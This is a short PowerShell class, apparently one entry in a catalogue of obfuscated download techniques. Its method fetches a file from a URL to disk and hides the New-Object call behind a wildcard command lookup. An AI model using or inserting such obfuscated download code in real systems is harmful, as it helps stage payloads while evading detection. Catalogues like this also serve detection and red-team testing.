Class ObfDownloadFile4 {
    
    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Cmdlet\2
        (&(COMMAND N*ct)Net.WebClient).DownloadFile($url,$path)
    }

}